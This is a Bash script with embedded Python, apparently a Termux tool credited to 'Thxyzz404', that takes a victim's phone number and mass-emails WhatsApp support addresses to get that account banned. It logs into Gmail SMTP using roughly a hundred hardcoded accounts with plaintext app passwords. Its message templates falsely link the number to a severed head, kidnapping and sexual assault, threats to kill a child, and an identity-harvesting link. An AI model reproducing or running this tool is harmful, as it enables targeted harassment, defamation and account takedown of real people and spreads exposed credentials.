g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
BLACKLIST=(
"6285135415428"
)
cek_blacklist() {
local nomor=$1
nomor=$(echo "$nomor" | sed 's/^+//')
for black in "${BLACKLIST[@]}"; do
if [[ "$nomor" == "$black" ]]; then
    return 0
fi
done
return 1
}
bar() {
f=(
    "[\e[1;91m■\e[0m□□□□□□□□□]"
    "[\e[1;92m■■\e[0m□□□□□□□□]"
    "[\e[1;93m■■■\e[0m□□□□□□□]"
    "[\e[1;94m■■■■\e[0m□□□□□□]"
    "[\e[1;95m■■■■■\e[0m□□□□□]"
    "[\e[1;96m■■■■■■\e[0m□□□□]"
    "[\e[1;97m■■■■■■■\e[0m□□□]"
    "[\e[1;92m■■■■■■■■\e[0m□□]"
    "[\e[1;93m■■■■■■■■■\e[0m□]"
    "[\e[1;94m■■■■■■■■■■\e[0m]"
)
while true; do
for fra in "${f[@]}"; do
 printf "\r$fra \033[41;1m\033[1;32mReport_Aktif!!\033[0m "
sleep 0.12
done
done
}
spam_report_wea() {
clear
mek="ansi-rounded"
echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⡿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠘⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠈⠻⢿⣿⠟⠉⠛⠿⣿⣿⣿⣿⣿⣿⠃
⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣴⣾⣿⣿⣿⣿⡿⠁⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀
⠠⠛⠛⠛⠉⠁⠀⠈⠙⠛⠛⠿⠿⠿⠿⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$mek" | lolcat
echo ""
echo -e "\033[100;32m======================================\033[0m"
echo -e "${p}        Developer ${r}: ${c}Thxyzz404"
echo -e "\033[100;32m======================================\033[0m"
echo ""
echo -e "\033[100;36mHENTIKAN PENYERANGAN TEKAN [ CTRL + Z ]\033[0m"
echo ""
echo ""
read -p "$(echo -e "${y}Masukkan no target ${r}[ ${g}contoh : 62xxx ${r}]${c} : ")" get
if [ -z "$get" ]; then
  clear 
  echo ""
  echo -e "${r} Nomer jangan kosong."
  echo ""
  return
fi
if cek_blacklist "$get"; then
clear
echo ""
echo -e "${r}========================================${c}"
echo -e "${g}    ⛔ NOMER OWNER DI BLACKLIST ⛔"
echo -e "${r}========================================${c}"
echo ""
echo -e "${g}Sekedar saran aja, jangan coba-coba bermasalah,"
echo -e "${g}Sama admin dah, nanti aksesnya di cabut,"
echo -e "${c}Menyesal 🙄😌"
echo ""
return
fi
no=$(echo "$get" | tr -d ' ')
if [[ ! "$no" =~ ^\+?[0-9]{8,15}$ ]]; then
    clear 
    echo ""
    echo -e "${r} Formatnya yg bener dongs."
    echo ""
    return
fi
[[ ! "$no" =~ ^\+ ]] && no="+$no"    
echo ""
bar &
LOAD_PID=$!
python3 -c "
import sys
import time
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import phonenumbers

nomor_input = '$get'

EMAIL_TARGETS = [
  'support@support.whatsapp.com',
  'android@support.whatsapp.com',
  'ios@support.whatsapp.com',
  'windows@support.whatsapp.com',
  'web@support.whatsapp.com',
  'desktop@support.whatsapp.com',
  'business@support.whatsapp.com',
  'api@support.whatsapp.com',
  'beta@support.whatsapp.com',
  'security@support.whatsapp.com',
  'privacy@support.whatsapp.com',
  'legal@support.whatsapp.com',
  'billing@support.whatsapp.com',
  'payments@support.whatsapp.com',
  'sales@support.whatsapp.com',
  'help@support.whatsapp.com',
  'team@support.whatsapp.com',
  'contact@support.whatsapp.com',
  'feedback@support.whatsapp.com',
  'bugs@support.whatsapp.com',
  'bugreport@support.whatsapp.com',
  'abuse@support.whatsapp.com',
  'report@support.whatsapp.com',
  'admin@support.whatsapp.com',
  'info@support.whatsapp.com',
  'press@support.whatsapp.com',
  'media@support.whatsapp.com',
  'marketing@support.whatsapp.com',
  'developer@support.whatsapp.com',
  'developers@support.whatsapp.com',
  'docs@support.whatsapp.com',
  'documentation@support.whatsapp.com',
  'partner@support.whatsapp.com',
  'partners@support.whatsapp.com',
  'enterprise@support.whatsapp.com',
  'education@support.whatsapp.com',
  'careers@support.whatsapp.com',
  'jobs@support.whatsapp.com',
  'hr@support.whatsapp.com',
  'finance@support.whatsapp.com',
  'account@support.whatsapp.com',
  'accounts@support.whatsapp.com',
  'verify@support.whatsapp.com',
  'verification@support.whatsapp.com',
  'recovery@support.whatsapp.com',
  'appeal@support.whatsapp.com',
  'compliance@support.whatsapp.com',
  'policy@support.whatsapp.com',
  'terms@support.whatsapp.com',
  'community@support.whatsapp.com',
  'moderation@support.whatsapp.com',
  'cloud@support.whatsapp.com',
  'hosting@support.whatsapp.com',
  'infra@support.whatsapp.com',
  'network@support.whatsapp.com',
  'noc@support.whatsapp.com',
  'ops@support.whatsapp.com',
  'engineering@support.whatsapp.com',
  'qa@support.whatsapp.com',
  'test@support.whatsapp.com',
  'automation@support.whatsapp.com',
  'devops@support.whatsapp.com',
  'root@support.whatsapp.com',
  'mail@support.whatsapp.com',
  'smtp@support.whatsapp.com',
  'postmaster@support.whatsapp.com',
  'noreply@support.whatsapp.com',
  'notifications@support.whatsapp.com',
  'update@support.whatsapp.com',
  'alerts@support.whatsapp.com',
  'status@support.whatsapp.com',
  'service@support.whatsapp.com',
  'services@support.whatsapp.com',
  'client@support.whatsapp.com',
  'customers@support.whatsapp.com',
  'customer@support.whatsapp.com',
  'vip@support.whatsapp.com',
  'premium@support.whatsapp.com',
  'general@support.whatsapp.com',
  'hello@support.whatsapp.com',
  'contactus@support.whatsapp.com'
]

def get_email_senders():
    return [
        {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
        {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
        {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
        {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
        {'email': 'anonimousee909@gmail.com', 'app_password': 'vwsz udcr zwtn nddt'},
        {'email': 'anonimouse90909@gmail.com', 'app_password': 'hhgl fmji jsae sqxu'},
        {'email': 'anonimouse9099@gmail.com', 'app_password': 'qpss riuo pkjk tmeg'},
        {'email': 'anonimouse90999@gmail.com', 'app_password': 'ijrf hhuo jpml iysc'},
        {'email': 'aaabaaah2@gmail.com', 'app_password': 'oqtx elxg cefv dgvd'},
        {'email': 'anjaynathan399@gmail.com', 'app_password': 'cpil kwkt llab sodh'},
        {'email': 'joeellan26@gmail.com', 'app_password': 'wnfe iboi ktrr uder'},
        {'email': 'bayarutangllu@gmail.com', 'app_password': 'cbty vvaf rncu oawg'},
        {'email': 'cindyfiolita9@gmail.com', 'app_password': 'kpvu treo hfar zqdy'},
        {'email': 'anonymousgalirus@gmail.com', 'app_password': 'ltnc fedd qzsy lfwu'},
        {'email': 'gstorekonter4@gmail.com', 'app_password': 'xwdq ugie fbjw xeaa'},
        {'email': 'makluetekerbpaluhekel@gmail.com', 'app_password': 'oyys dexg uofj vhkt'},
        {'email': 'fire.send482@gmail.com', 'app_password': 'dpus bvni hmvn caob'},
        {'email': 'jiki.mioli08@gmail.com', 'app_password': 'gzwj sohl dzxd pteh'},
        {'email': 'tayotayooxirf@gmail.com', 'app_password': 'edpj gvcx fehp rtfl'},
        {'email': 'tayo404tayyo404@gmail.com', 'app_password': 'jeat hezh ditz akuk'},
        {'email': 'irfafitrio@gmail.com', 'app_password': 'khtm tnxz nbey ahue'},
        {'email': 'sigmamewing1232@gmail.com', 'app_password': 'trzs dett smbl iykw'},
        {'email': 'joyditiano9@gmail.com', 'app_password': 'rnfv nfqa ggcf lyqn'},
        {'email': 'draid6247@gmail.com', 'app_password': 'dhwm abuc vkan sofg'},
        {'email': 'daemontechx@gmail.com', 'app_password': 'jxov iorq ztpw hirz'},
        {'email': 'daemoniumuserv2@gmail.com', 'app_password': 'yexa nkvy ghqh hsbd'},
        {'email': 'daemoniumuser@gmail.com', 'app_password': 'wgas iris atyy xpnc'},
        {'email': 'c26898771@gmail.com', 'app_password': 'ykky jurp svqq kmhj'},
        {'email': 'rizkicuaca62@gmail.com', 'app_password': 'azud gild ptqm ooip'},
        {'email': 'bunawarhadi@gmail.com', 'app_password': 'qhub vsfb oytb qqoa'},
        {'email': 'gutodoang@gmail.com', 'app_password': 'rcer clrw tckg ppea'},
        {'email': 'bocahbebanbocahbeban@gmail.com', 'app_password': 'fdye aial ngai clqp'},
        {'email': 'siniluanjing484@gmail.com', 'app_password': 'chji sayr htkq wjjz'},
        {'email': 'qoegvnv@gmail.com', 'app_password': 'ueha fbsz unmb jqzj'},
        {'email': 'takame829@gmail.com', 'app_password': 'firo ngvs xali pfjy'},
        {'email': 'haihakjsbsajsjnebsh5@gmail.com', 'app_password': 'qvar taip eifk mxki'},
        {'email': 'ythead.gtrva001@gmail.com', 'app_password': 'fdrr hjpa srza rops'},
        {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
        {'email': 'zarkymark7@gmail.com', 'app_password': 'jlem mvwf nsog bvpq'},
        {'email': 'periport01@gmail.com', 'app_password': 'chpo ubdi snry fafw'},
        {'email': 'reyhad52@gmail.com', 'app_password': 'cnyo txjs jzbi hkea'},
        {'email': 'asepanjang121@gmail.com', 'app_password': 'yidj nlkm irci yluy'},
        {'email': 'testimonialyayaya@gmail.com', 'app_password': 'mtkq kpaf gtjp zgbn'},
        {'email': 'dedegaming@gmail.com', 'app_password': 'eikc xzqm qdvf xzzm'},
        {'email': 'buljem885@gmail.com', 'app_password': 'maug wpoh hddc uthh'},
        {'email': 'rahmanianabila75@gmail.com', 'app_password': 'elyn sgyr qqyx gxhi'},
        {'email': 'gufronjah@gmail.com', 'app_password': 'ulzr gfgd fhuj fahh'},
        {'email': 'takame829@gmail.com', 'app_password': 'firo ngvs xali pfjy'},
        {'email': 'haihakjsbsajsjnebsh5@gmail.com', 'app_password': 'qvar taip eifk mxki'},
        {'email': 'adrianardhiaksa86@gmail.com', 'app_password': 'urjk hrij fjia exrb'},
        {'email': 'kugarider81@gmail.com', 'app_password': 'tbrh swfk humn ejse'},
        {'email': 'comelmamat74@gmail.com', 'app_password': 'nvbr wwrk atho bier'},
        {'email': 'dyantisukiem@gmail.com', 'app_password': 'zprf qelo tzqp wyac'},
        {'email': 'hilaryartasia@gmail.com', 'app_password': 'dscu jgry ikof ldcg'},
        {'email': 'satriaasiapayaaa@gmail.com', 'app_password': 'yzey ztnh apak xeva'},
        {'email': 'syafaazahraa339@gmail.com', 'app_password': 'kvnv urhk ectd hcyd'},
        {'email': 'azzahrasyafir1@gmail.com', 'app_password': 'upqe wtus lrga bxzh'},
        {'email': 'Baksososial84@gmail.com', 'app_password': 'agyn cnsh wkrn baqw'},
        {'email': 'divikvidik@gmail.com', 'app_password': 'enkt cpcw beom ggey'},
        {'email': 'shoope1456@gmail.com', 'app_password': 'ihwu mtuk ilpf hjng'},
        {'email': 'justzero194@gmail.com', 'app_password': 'nadf fgan fbew uyhc'},
        {'email': 'makluetekerbpaluhekel@gmail.com', 'app_password': 'oyys dexg uofj vhkt'},
        {'email': 'fire.send482@gmail.com', 'app_password': 'dpus bvni hmvn caob'},
        {'email': 'jiki.mioli08@gmail.com', 'app_password': 'gzwj sohl dzxd pteh'},
        {'email': 'tayotayooxirf@gmail.com', 'app_password': 'edpj gvcx fehp rtfl'},
        {'email': 'tayo404tayyo404@gmail.com', 'app_password': 'jeat hezh ditz akuk'},
        {'email': 'irfafitrio@gmail.com', 'app_password': 'khtm tnxz nbey ahue'},
        {'email': 'sigmamewing1232@gmail.com', 'app_password': 'trzs dett smbl iykw'},
        {'email': 'joyditiano9@gmail.com', 'app_password': 'rnfv nfqa ggcf lyqn'},
        {'email': 'draid6247@gmail.com', 'app_password': 'dhwm abuc vkan sofg'},
        {'email': 'daemontechx@gmail.com', 'app_password': 'jxov iorq ztpw hirz'},
        {'email': 'daemoniumuserv2@gmail.com', 'app_password': 'yexa nkvy ghqh hsbd'},
        {'email': 'c26898771@gmail.com', 'app_password': 'ykky jurp svqq kmhj'},
        {'email': 'rizkicuaca62@gmail.com', 'app_password': 'azud gild ptqm ooip'},
        {'email': 'bunawarhadi@gmail.com', 'app_password': 'qhub vsfb oytb qqoa'},
        {'email': 'gutodoang@gmail.com', 'app_password': 'rcer clrw tckg ppea'},
        {'email': 'bocahbebanbocahbeban@gmail.com', 'app_password': 'fdye aial ngai clqp'},
        {'email': 'siniluanjing484@gmail.com', 'app_password': 'chji sayr htkq wjjz'},
        {'email': 'qoegvnv@gmail.com', 'app_password': 'ueha fbsz unmb jqzj'},
        {'email': 'takame829@gmail.com', 'app_password': 'firo ngvs xali pfjy'},
        {'email': 'haihakjsbsajsjnebsh5@gmail.com', 'app_password': 'qvar taip eifk mxki'},
        {'email': 'ythead.gtrva001@gmail.com', 'app_password': 'fdrr hjpa srza rops'},
        {'email': 'zarkymark7@gmail.com', 'app_password': 'jlem mvwf nsog bvpq'},
        {'email': 'periport01@gmail.com', 'app_password': 'chpo ubdi snry fafw'},
        {'email': 'reyhad52@gmail.com', 'app_password': 'cnyo txjs jzbi hkea'},
        {'email': 'dedegaming@gmail.com', 'app_password': 'eikc xzqm qdvf xzzm'},
        {'email': 'adrianardhiaksa86@gmail.com', 'app_password': 'urjk hrij fjia exrb'},
        {'email': 'kugarider81@gmail.com', 'app_password': 'tbrh swfk humn ejse'},
        {'email': 'comelmamat74@gmail.com', 'app_password': 'nvbr wwrk atho bier'},
        {'email': 'syafaazahraa339@gmail.com', 'app_password': 'kvnv urhk ectd hcyd'},
        {'email': 'azzahrasyafir1@gmail.com', 'app_password': 'upqe wtus lrga bxzh'},
        {'email': 'Baksososial84@gmail.com', 'app_password': 'agyn cnsh wkrn baqw'},
        {'email': 'shoope1456@gmail.com', 'app_password': 'ihwu mtuk ilpf hjng'},
        {'email': 'justzero194@gmail.com', 'app_password': 'nadf fgan fbew uyhc'},
        {'email': 'nurrubby97@gmail.com', 'app_password': 'tmai cfbh tksk ltcz'},
        {'email': 'idaaff00@gmail.com', 'app_password': 'qcbz ekdc xseq cpyo'},
        {'email': 'superbot385@gmail.com', 'app_password': 'bsmw dtcp akfx xczt'},
        {'email': 'nurdarattulrubycorn123@gmail.com', 'app_password': 'mysa uexs tnnl ahvi'},
        {'email': 'kontz67@gmail.com', 'app_password': 'adre wxzw mmbu opne'},
        {'email': 'bantuanwa190@gmail.com', 'app_password': 'bftr iqho gpqp goca'},
        {'email': 'shoope1456@gmail.com', 'app_password': 'fpvi uacn rpbc ezwl'},
        {'email': 'shoopee1456@gmail.com', 'app_password': 'kbzw gzwz xfho autc'},
        {'email': 'hannshanns14@gmail.com', 'app_password': 'zpow heji xidr lauq'},
        {'email': 'repfake18@gmail.com', 'app_password': 'sjcs rxxh xdmd ulkn'},
        {'email': 'free2159001@gmail.com', 'app_password': 'sipf daqd pznm ptll'},
        {'email': 'alifstorezzzz12@gmail.com', 'app_password': 'qjsz xapc kwcs jhpi'},
        {'email': 'freecuy222@gmail.com', 'app_password': 'sfnk mdaw khfa xetg'},
        {'email': 'gagggagg996@gmail.com', 'app_password': 'ukqo udbl xpbz bnou'},
        {'email': 'kw0098225@gmail.com', 'app_password': 'vaed gnja ahcr bbaa'},
        {'email': 'haikhalanwari934@gmail.com', 'app_password': 'zhua qrno zchn synu'},
        {'email': 'prabowo1490@gmail.com', 'app_password': 'uaqb lljp zqkl woaj'},
        {'email': 'ilovesawit114@gmail.com', 'app_password': 'bqie bcfq tvde fldi'},
        {'email': 'gibran19jtlp@gmail.com', 'app_password': 'hdeh pvzn rwtb ldns'},
        {'email': 'raceto820@gmail.com', 'app_password': 'tydx mtzt wgcb rlve'},
        {'email': 'pinespineapple378@gmail.com', 'app_password': 'gjcf pdhd xcpt rxxt'},
        {'email': 'killuazoldyck17059@gmail.com', 'app_password': 'fzhp hsug ngoz uywn'},
        {'email': 'akunsgreaper020@gmail.com', 'app_password': 'qspz jakb ayfx gtgo'},
        {'email': 'shoppepaylater62@gmail.com', 'app_password': 'ftki gban fgim nzyf'},
        {'email': 'politronsharp478@gmail.com', 'app_password': 'cbmp shde gphr olee'},
    ]

def buat_subject(nomor):
    subjects = [
        f'Report Abuse - {nomor}',
        f'Complaint - {nomor}',
        f'Fraud Alert - {nomor}',
        f'Spam Report - {nomor}',
        f'Legal Complaint - {nomor}'
    ]
    return random.choice(subjects)

def buat_body(nomor):
    templates_v1 = [
        f'''Para usuários de privacidade legal do WhatsApp.

Há notícias emocionantes, nomeadamente a descoberta da CABEÇA HUMANA.

Uma descoberta horrível foi relatada na área de Pasaje quando, por volta das 15h40, no FORTE LOS NARANJOS, os guardas do setor descobriram uma mochila suspeita.

Depois de examinar o conteúdo, uma cabeça humana foi encontrada no interior.

Policiais do circuito Velasco Ibarra foram imediatamente alertados e se deslocaram ao local para verificar a denúncia.

As autoridades confirmaram a presença da peça anatômica e iniciaram o isolamento da área para a realização dos procedimentos necessários.

Os investigadores estão atualmente a recolher informações sobre a origem da mala e as circunstâncias em que a mochila foi deixada.

A polícia solicitou a intervenção de unidades especiais para iniciar as investigações relacionadas.

Se você quiser ver as fotos do incidente, pode clicar no link 🔗👇

https://ibb.co.com/kJm3bzD

Abaixo está uma foto da vítima de homicídio 🔪🔪

Para mais informações sobre essa novidade maluca entre em contato pelo nosso WhatsApp 💬👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
    ]
    
    templates_v2 = [
        f'''Olá senhor, 😈 Como está? Prazer em revê-lo 💀. Estou aqui para lhe dizer que raptei a sua esposa ☠️🔥 e abusei dela 💦🫦. Se não acredita em mim, pode espreitar a foto neste link 👇👇
Link: https://h.top4top.io/p_3848e3n7b1.jpg
Se quiser que este assédio sexual contra a sua mulher pare 🥷, terá de me pagar 🤑 e encontramo-nos num prédio que nunca ninguém visitou 🤫. Se chegarmos a um acordo, a mulher do meu senhor será libertada. Entre em contacto aqui se o nosso acordo estiver garantido.

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
    ]
    
    templates_v3 = [
        f'''لنربح ٥٠٠ دولار! كيف ذلك يا صديقي؟ ببساطة، ادخل إلى هذا الرابط الرائع! 🥰🔥
الرابط: https://rank-1.mamtahospitalwakad.com
الشروط والأحكام 👇
• أدخل بيانات بطاقة هويتك.

• التقط صورة سيلفي واضحة لكل جانب من جوانب وجهك.

• أدخل جميع معلوماتك.

يرجى التواصل مع المسؤول أدناه 🤑👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
    ]

    templates_v4 = [
        f'''Chào cộng đồng WhatsApp thân mến, có thông tin cho biết có người đã vi phạm quy tắc của WhatsApp và có hành vi spam nghiêm trọng. Để xem ảnh, hãy nhấp vào liên kết này 👇
https://h.top4top.io/p_3849527i51.jpg

Gửi đến người gây ra hành vi này tại số điện thoại này 👇
https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor},

Vui lòng liên hệ ngay với số điện thoại này để ngăn chặn hành vi tương tự xảy ra lần nữa, hoặc xóa số điện thoại của người gây ra hành vi này. 🙏 Đó là tất cả từ tôi, cảm ơn và mong các bạn thông cảm về thông tin mới nhất. 🙏'''
    ]
      
    templates_v5 = [
        f'''עברית:

*היי! לילה טוב משפחת פאנק ☠️🔪*  
אני כאן כדי ליצור איתכם קשר 💀, כדי שכל העושר והרכוש שלכם 💸 יועברו אלינו 🔪.  
אם לא תעבירו אלינו? אני אהרוג את הילד שלכם!! 😈🔥  
אם אתם לא מאמינים לי? תבדקו את תמונת ההוכחה הזו 👇👇  
קישור: https://j.top4top.io/p_3848w3yun1.jpg

אם אתם מסכימים? בבקשה תעשו מה שאני מבקש.  
אם אתם מסכימים, צרו קשר עם המספר שלנו למטה 🥷👇  
https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}
        
Apoiado por:
abuse@whatsapp.com
support@whatsapp.com
business@support.whatsapp.com
smb@support.whatsapp.com''',
        
        f'''Urgent Report: Violation of WhatsApp Terms - {nomor}

We have detected multiple suspicious activities associated with this number.

Please investigate immediately.

Reference: Case #{random.randint(100000,999999)}'''
    ]
    
    all_templates = templates_v1 + templates_v2 + templates_v3 + templates_v4 + templates_v5
    return random.choice(all_templates)

def kirim_email(sender_info, nomor):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_info['email']
        msg['Subject'] = buat_subject(nomor)
        msg.attach(MIMEText(buat_body(nomor), 'plain'))

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_info['email'], sender_info['app_password'])
        except:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(sender_info['email'], sender_info['app_password'])

        server.sendmail(sender_info['email'], EMAIL_TARGETS, msg.as_string())
        server.quit()
        time.sleep(random.uniform(2, 5))
        return True
    except:
        return False

def validasi_nomor(nomor_input):
    try:
        if not nomor_input.startswith('+'):
            nomor_input = '+' + nomor_input
        parsed = phonenumbers.parse(nomor_input, None)
        if phonenumbers.is_valid_number(parsed):
            return phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    except:
        pass
    return None

nomor = validasi_nomor(nomor_input)
if not nomor:
    sys.exit(1)

senders = get_email_senders()
berhasil = 0
gagal = 0

for sender in senders:
    if kirim_email(sender, nomor):
        berhasil += 1
    else:
        gagal += 1
    time.sleep(random.uniform(1, 3))

print(f'\033[32;1mBerhasil Terkirim : {berhasil}')
print(f'\033[31;1mGagal Terkirim : {gagal}')
"
kill $LOAD_PID 2>/dev/null
wait $LOAD_PID 2>/dev/null
echo -e "\r\033[K"
echo ""
}
spam_report_wea
